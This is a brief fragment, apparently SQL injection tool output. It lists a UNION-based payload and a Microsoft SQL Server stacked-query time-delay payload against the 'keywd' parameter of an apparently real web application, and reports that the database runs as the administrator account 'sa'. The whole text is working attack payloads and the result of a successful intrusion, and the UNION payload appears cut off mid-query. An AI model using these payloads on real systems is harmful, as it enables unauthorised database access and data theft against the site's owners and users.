 Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: keywd=a' UNION ALL SELECT 10, &ft=news&userid=njhisense    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: keywd=a'; WAITFOR DELAY '0:0:5';--&ft=news&userid=njhisense---current user:    'sa'
